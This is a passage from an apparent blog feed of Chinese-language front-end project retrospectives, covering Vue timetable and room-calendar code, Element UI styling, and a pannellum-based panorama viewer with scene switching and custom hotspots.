class="built_in">this</span>.satDayTime + <span class="number">86400000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> data = res.data;</span><br><span class="line">      <span class="keyword">if</span> (data.success) &#123;</span><br><span class="line">        <span class="comment">// lessonsList 是一周内的课表</span></span><br><span class="line">        <span class="built_in">this</span>.lessonsList = data.data;</span><br><span class="line">        <span class="comment">// 先初始化 classWeekList ，再更新每一个 classDayList 中的课程</span></span><br><span class="line">        <span class="built_in">this</span>.clearWeekClass();</span><br><span class="line">        <span class="built_in">this</span>.getClassDayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.classWeekList.length; i++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; <span class="built_in">this</span>.classWeekList[i].classDayList.length;j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> item = <span class="built_in">this</span>.classWeekList[i].classDayList[j];</span><br><span class="line">            <span class="comment">// item.id 不为空代表有课，否则就是默认的 &quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (item.id !== <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">              <span class="comment">// 得到每节课的颜色</span></span><br><span class="line">              <span class="built_in">this</span>.getLessonRgb(item);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">getClassDayList</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lessonsList.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> day = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.lessonsList[i].beginTime).getDay();</span><br><span class="line">    <span class="keyword">var</span> hour = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.lessonsList[i].beginTime).getHours();</span><br><span class="line">    <span class="comment">// 总的思路就是根据时间(hour)判断，并通过周几(day)赋值</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">0</span> &amp;&amp; hour &lt; <span class="number">9</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">0</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">9</span> &amp;&amp; hour &lt; <span class="number">12</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">1</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">12</span> &amp;&amp; hour &lt; <span class="number">16</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">2</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">16</span> &amp;&amp; hour &lt; <span class="number">19</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">3</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">19</span> &amp;&amp; hour &lt; <span class="number">24</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">4</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="八、课表中的颜色显示"><a href="#八、课表中的颜色显示" class="headerlink" title="八、课表中的颜色显示"></a>八、课表中的颜色显示</h2><p>由于后台返回的数据中没有课程的 rgb 属性，因此需要根据课程id再查询课程的颜色。原型如下：<img src="https://i.loli.net/2021/07/24/oauc8rWjXz6spUD.png" alt="2021033113003059.png"></p><p>起初想利用双向绑定：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; color: &#x27;#&#x27; + item.rgb &#125;&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">item.rgb = res.data.data.rgb</span><br></pre></td></tr></table></figure><p>但这样会存在 <strong>最初页面渲染完后，课程颜色不会改变</strong> 的 bug ，由于异步的原因，item.rgb 会在页面刷新完后赋值，因此双向绑定也就无法第一时间完成？</p><h2 id="实现方案-4"><a href="#实现方案-4" class="headerlink" title="实现方案"></a>实现方案</h2><p>向学长请教后得知，<strong>对象在双向绑定中无法被监听到，所以要用Vue.$set</strong> 。</p><p><a href="https://www.jianshu.com/p/71b1807b1815">https://www.jianshu.com/p/71b1807b1815</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getLessonRgb</span>(<span class="params">item</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryLessonDetail&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">lessonId</span>: item.lessonId,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      Vue.$set(item,<span class="string">&#x27;rgb&#x27;</span>,res.data.data.rgb);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="九、修改-Element-UI-的样式"><a href="#九、修改-Element-UI-的样式" class="headerlink" title="九、修改 Element UI 的样式"></a>九、修改 Element UI 的样式</h2><p>有时会出现在 style scoped 里修改样式无效的情况，此时可尝试另起一个style，全局修改样式。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-class">.el-input__inner</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">140px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.el-time-spinner__item</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">35px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="十、列表判空处理"><a href="#十、列表判空处理" class="headerlink" title="十、列表判空处理"></a>十、列表判空处理</h2><p>当想循环一个列表中的图片时，一定要先进行判空处理，不然<strong>可能</strong>会出现 xxx “null” 的报错！（后台没有图片数据，因此 imageUrls[i] 也没有photoUrl属性）</p><p><img src="https://i.loli.net/2021/07/24/sSCOdENUuDWT594.png" alt="20210331132523642.png"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> photoList = [];</span><br><span class="line"><span class="keyword">if</span> (item.imageUrls == <span class="literal">null</span>) &#123;</span><br><span class="line">  photoList = [];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; item.imageUrls.length; i++) &#123;</span><br><span class="line">    photoList.push(item.imageUrls[i].photoUrl);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十一、代码复用性"><a href="#十一、代码复用性" class="headerlink" title="十一、代码复用性"></a>十一、代码复用性</h2><p>在实现订单模块时，需要根据订单的不同状态进入不同页面。<img src="https://i.loli.net/2021/07/24/HLkgDz4S96YUEpl.jpg" alt="Snipaste_2021-07-24_17-05-14.jpg"></p><p>大概有4、5种情况，每个页面基本类似，但是有几个 label 和 button 的区别。刚开始做的时候脑子一糊涂，重复画了很多页面，看看路由中的导入就清楚：<img src="https://i.loli.net/2021/07/24/PMo53AxStD9gvc8.png" alt="image.png"></p><p>严重违背项目开发的原则。</p><p>其实只需要通过 <code>v-if=&quot;this.infoList.status == &#39;预订成功&#39;&quot;</code> 改变各个元素的显示与隐藏，一个 vue 文件就能实现。</p><h2 id="房态日历模块"><a href="#房态日历模块" class="headerlink" title="房态日历模块"></a>房态日历模块</h2><p>需要实现根据剩余房间数变色和动态显示日历。</p><p><img src="https://i.loli.net/2021/07/24/8AJNwaLt91zkysh.png"></p><p>是根据动态绑定css样式实现的：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in roomList&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;cell&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:class</span>=<span class="string">&quot;chooseBackground(item.availableHouse)&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:class</span>=<span class="string">&quot;chooseTextColor(item.availableHouse)&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-model</span>=<span class="string">&quot;item.availableHouse&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>同时利用 computed 计算样式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  <span class="function"><span class="title">chooseTextColor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">//根据剩余房间数选择文字显示颜色</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">num</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (num &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-green&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">3</span> &amp;&amp; num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-yellow&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-red&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">chooseBackground</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">//根据剩余房间数选择方格的背景色</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">num</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (num &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-normal&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">3</span> &amp;&amp; num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-yellow&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-red&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>对二维码进行解码时，用到jimp，但是出现<a href="https://blog.csdn.net/weixin_43839461/article/details/106494602%E3%80%82%E9%87%87%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%80%E4%BA%8C%E5%A5%BD%E5%83%8F%E9%83%BD%E6%B2%A1%E4%BD%9C%E7%94%A8%EF%BC%8C%E6%9C%80%E5%90%8E%E9%80%9A%E8%BF%87https://segmentfault.com/q/1010000012054980%E8%A7%A3%E5%86%B3%E3%80%82">https://blog.csdn.net/weixin_43839461/article/details/106494602。采用方法一二好像都没作用，最后通过https://segmentfault.com/q/1010000012054980解决。</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我对实验室校企合作项目——“贤得家e社区学堂管理系统”的复盘总结。项目接手时间大概在2020年12月底，寒假拖拖拉拉了挺久，最后于20</summary>
      
    
    
    
    <category term="项目复盘" scheme="https://asura1211.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98/"/>
    
    
  </entry>
  
  <entry>
    <title>【项目复盘】— — 基于pannellum的全景H5页面实现</title>
    <link href="https://asura1211.github.io/2021/07/13/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E5%9F%BA%E4%BA%8Epannellum%E7%9A%84%E5%85%A8%E6%99%AF%E5%AE%9E%E7%8E%B0/"/>
    <id>https://asura1211.github.io/2021/07/13/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E5%9F%BA%E4%BA%8Epannellum%E7%9A%84%E5%85%A8%E6%99%AF%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-07-13T20:24:04.000Z</published>
    <updated>2021-11-24T11:43:52.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言-amp-背景"><a href="#前言-amp-背景" class="headerlink" title="前言&amp;背景"></a>前言&amp;背景</h1><p>本文是我对实验室校企合作项目——“基于pannellum的全景H5页面实现”的复盘总结。目前尚未完全实现甲方需求，但是经过自己不断的探索后已经大概完成现阶段要求，故因此做个总结。</p><p>由于小程序端的全景实现存在显示不了图片的bug（具体情况我也不是很清楚），所以负责人就决定让web前端做一个VR全景网页，然后在小程序中用webview方式引入。项目开始是在2021年6月中旬，正逢考试周，因此直到7.10考完，在7.14才大致完工（仍有一些bug）。前端全景网页实现采用了基于WebGL和JavaScript的pannellum开源全景组件。</p><p><a href="https://kssmtjyrkb.feishu.cn/docs/doccnrBkePY1Nakja4wB1jmGhxh#">项目总结</a></p><h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h1><p>该项目主要是为了在客户买房时有更好的视觉体验，从而制作了一个全景看房网页。主要功能有点击热点进行场景的切换、点击按钮出现一二级列表从而进行跳跃式场景切换。</p><h1 id="遇到的问题（需要做的事）"><a href="#遇到的问题（需要做的事）" class="headerlink" title="遇到的问题（需要做的事）"></a>遇到的问题（需要做的事）</h1><h2 id="一、点击列表实现场景切换"><a href="#一、点击列表实现场景切换" class="headerlink" title="一、点击列表实现场景切换"></a>一、点击列表实现场景切换</h2><p>基于对<a href="https://pannellum.org/documentation/api/">pannellum官网</a>的学习，最初打算以原生javascript的方式实现该网页，最终的实现效果如下图：（列表是通过点击左下角按钮出现的）</p><p><img src="https://i.loli.net/2021/07/14/1GRyF7J8LsOWCuU.jpg" alt="QQ图片20210714211541.jpg"></p><p>但是这里我只是在js代码中通过</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pannellum.viewer(<span class="string">&#x27;panorama&#x27;</span>, &#123;</span><br><span class="line"><span class="string">&quot;default&quot;</span>: &#123;...&#125;，</span><br><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建了一个对象（也就是上图中的背景），利用scenes中的不同对象实现不同的场景，利用hotSpots进行场景间切换。简单放一下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">//一个场景</span></span><br><span class="line">        <span class="string">&quot;scene1&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">30</span>, </span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//热点跳转</span></span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">10</span>, <span class="comment">// 上下 0,0默认中心</span></span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">0</span>, <span class="comment">// 左右</span></span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>, <span class="comment">// 切换热点类型</span></span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene2&quot;</span>, </span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;scene2&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">30</span>,</span><br><span class="line">            ...</span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;hfov&quot;</span>: <span class="number">150</span>,</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">15</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene1&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;hfov&quot;</span>: <span class="number">150</span>,</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">20</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">100</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene3&quot;</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然而</strong>，这无法实现点击列表跳转到另一个场景。首先我认为在这个组件中，每一个场景都应该是一个全景对象，即通过<code>pannellum.viewer</code>创造出来的对象，但是现在整个文件中只有一个。</p><p>也曾想把点击列表事件与点击热点事件相绑定，但是通过查阅文档，发现<code>clickHandlerFunc</code> 事件意思为：添加此函数作为热点事件的事件处理程序<code>click</code> ，而没法通过外部事件直接触发热点事件的点击事件。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>因此</strong>，我结合<a href="https://github.com/jarvisniu/vue-pannellum">github上的vue-pannellum项目</a>，（作者对pannellum进行了组件的封装，因此可以在一个vue项目中导入多个全景实例）并进行一定的改进，对点击事件进行url的绑定，从而实现上述功能。部分代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- pannellum组件 --&gt;</span><br><span class="line">    &lt;v-pannellum</span><br><span class="line">      v-if=&quot;true&quot;</span><br><span class="line">      class=&quot;pannellum&quot;</span><br><span class="line">      :src=&quot;url&quot;</span><br><span class="line">      :auto-rotate=&quot;true&quot;</span><br><span class="line">      :orientation=&quot;isOrientationOn&quot;</span><br><span class="line">      :auto-load=&quot;true&quot;</span><br><span class="line">      :show-zoom=&quot;false&quot;</span><br><span class="line">      :double-click-zoom=&quot;false&quot;</span><br><span class="line">      :show-fullscreen=&quot;false&quot;</span><br><span class="line">      :hotSpots=&quot;hotSpots&quot;</span><br><span class="line">      :hfov.sync=&quot;hfov&quot;</span><br><span class="line">      :yaw.sync=&quot;yaw&quot;</span><br><span class="line">      :pitch.sync=&quot;pitch&quot;</span><br><span class="line">    &gt;</span><br><span class="line">    &lt;/v-pannellum&gt;</span><br><span class="line">...</span><br><span class="line">&lt;--通过toImages函数切换到相应的VR全景--&gt;</span><br><span class="line"> &lt;div class=&quot;btn_list&quot;&gt;</span><br><span class="line">        &lt;div</span><br><span class="line">          v-for=&quot;(item, index) in labelList[k].imageList&quot;</span><br><span class="line">          :key=&quot;index&quot;</span><br><span class="line">          @click=&quot;toImages(item, index)&quot;</span><br><span class="line">          :class=&quot;index == 0 ? &#x27;btn_active&#x27; : &#x27;btn&#x27;&quot;</span><br><span class="line">          :style=&quot;&#123; backgroundImage: &#x27;url(&#x27; + item.url &#125;&quot;</span><br><span class="line">        &gt;</span><br><span class="line">          &lt;span class=&quot;div_span&quot;&gt;&#123;&#123; item.text &#125;&#125;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">     &lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//每个obj为通过pannellum.viewer() 创建的新的viewer instance</span></span><br><span class="line"><span class="function"><span class="title">toImages</span>(<span class="params">item, index</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.url = item.obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、取消或改变加载动画"><a href="#二、取消或改变加载动画" class="headerlink" title="二、取消或改变加载动画"></a>二、取消或改变加载动画</h2><p>在上述方法中，每通过pannellum.viewer() 创建一个新的viewer instance，就会一个新的WebGL context，除了严重影响网页性能外还避免不了切换viewer instance带来的加载页面动画，如下图所示：</p><p><img src="https://i.loli.net/2021/07/15/CMXe3kt2uop9fEZ.jpg" alt="QQ图片20210715101908.jpg"></p><p>因此现在的目标正是如何取消这个加载动画。在github上我与该pannellum组件作者进行了沟通：</p><p><img src="https://i.loli.net/2021/07/15/xZGoPMUFgEL2c8r.jpg" alt="Snipaste_2021-07-15_10-21-17.jpg"></p><h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>在一位好心陌生人的帮助下，<img src="https://i.loli.net/2021/07/16/JswgQYTh3yfNGLk.jpg" alt="Snipaste_2021-07-16_21-45-47.jpg"></p><p>我重新学习了官方文档中的 loadScene API，它的作用就是“Change scene being viewed.”，只需传入sceneId就能切换至对应场景，而且这是对场景的切换，而非像问题一的解决方法一样切换 viewer instance，极大减少了生成多个WebGL的开销。</p><p>因此在toImages 函数中，仅需一行代码实现场景切换：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//切换到相应的VR全景</span></span><br><span class="line"><span class="function"><span class="title">toImages</span>(<span class="params">item, index</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 加载全景，传入的item为静态写好的列表中对象</span></span><br><span class="line">    <span class="comment">// sceneId已提前写好，与viewer instance中的sceneId一致。</span></span><br><span class="line">    <span class="built_in">this</span>.viewer.loadScene(item.sceneId);</span><br><span class="line"><span class="comment">//变换css样式</span></span><br><span class="line">    <span class="keyword">let</span> btn = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>].getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">        btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    btn[index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>至此，</strong>一二问题都已得到解决。</p><h2 id="三、改变组件中热点样式"><a href="#三、改变组件中热点样式" class="headerlink" title="三、改变组件中热点样式"></a>三、改变组件中热点样式</h2><p>在pannellum中，热点是通过在scene中创建hotSpots实现的：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;circle&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">110</span>,</span><br><span class="line">            <span class="string">&quot;pitch&quot;</span>: -<span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;yaw&quot;</span>: <span class="number">117</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;equirectangular&quot;</span>,</span><br><span class="line">            <span class="string">&quot;panorama&quot;</span>: <span class="string">&quot;/images/from-tree.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">2.1</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">132.9</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;house&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;house&quot;</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认的样式如下图所示：</p><p><img src="https://i.loli.net/2021/07/15/SRT3xBXc8wlr6pH.jpg" alt="Snipaste_2021-07-15_10-24-34.jpg"></p><p>然而，实际的项目要求热点为上下左右箭头类型，并给出了对应的图片。</p><h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><p>通过查阅<a href="https://pannellum.org/documentation/reference/">pannellum文档</a>，可以通过</p><ul><li><code>cssClass</code>指定热点的 CSS 类。</li><li><code>createTooltipFunc</code> (function) 和<code>createTooltipArgs</code> (object) 创建热点工具提示DOM，其中<code>createTooltipArgs</code>将作为参数传递给函数。</li></ul><p>因此对hotSpots作出如下修改，绑定该热点css为”custom-hotspot”，并定义hotspot函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hotSpots: [</span><br><span class="line">&#123;</span><br><span class="line">      <span class="attr">pitch</span>: -<span class="number">10</span>,</span><br><span class="line">        <span class="attr">yaw</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;place2&quot;</span>,</span><br><span class="line">        <span class="attr">sceneId</span>: <span class="string">&quot;place2&quot;</span>,</span><br><span class="line">        <span class="attr">cssClass</span>: <span class="string">&quot;custom-hotspot&quot;</span>,</span><br><span class="line">        <span class="attr">createTooltipFunc</span>: <span class="built_in">this</span>.hotspot,</span><br><span class="line">        <span class="attr">createTooltipArgs</span>: <span class="string">&quot;办公区 up&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>采用在args中传入“up” “down” “left” “right” 的方式对当前热点背景图片类型进行判断，从而实现正确的显示。（前面的文字可用来作热点提示，但最后取消了、】【它4</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建热点函数</span></span><br><span class="line"><span class="function"><span class="title">hotspot</span>(<span class="params">hotSpotDiv, args</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> direction = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;up&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/up.png)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;down&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/down.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;left&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/left.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;right&quot;</span>: &#123;</span><br><span class="line">      